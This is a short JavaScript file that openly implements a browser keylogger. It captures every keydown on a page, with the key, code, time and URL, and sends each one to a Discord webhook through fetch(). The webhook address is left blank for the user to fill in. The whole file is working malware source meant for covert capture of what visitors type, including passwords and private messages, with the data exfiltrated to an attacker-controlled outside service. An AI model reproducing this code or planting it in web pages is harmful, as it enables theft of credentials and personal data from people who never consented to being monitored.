// Discord webhook URL - replace with your actual webhook URL
const webhookUrl = '';

// Function to send data to Discord
function sendToDiscord(data) {
  const payload = {
    content: `Keylogger Data: ${JSON.stringify(data)}`,
  };

  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(payload),
  })
  .catch(error => console.error('Error sending to Discord:', error));
}

// Simple keylogger implementation
document.addEventListener('keydown', function(event) {
  const keyData = {
    key: event.key,
    code: event.code,
    time: new Date().toISOString(),
    url: window.location.href,
    // Add more data as needed
  };
  
  sendToDiscord(keyData);
});

console.log('Keylogger initialized');
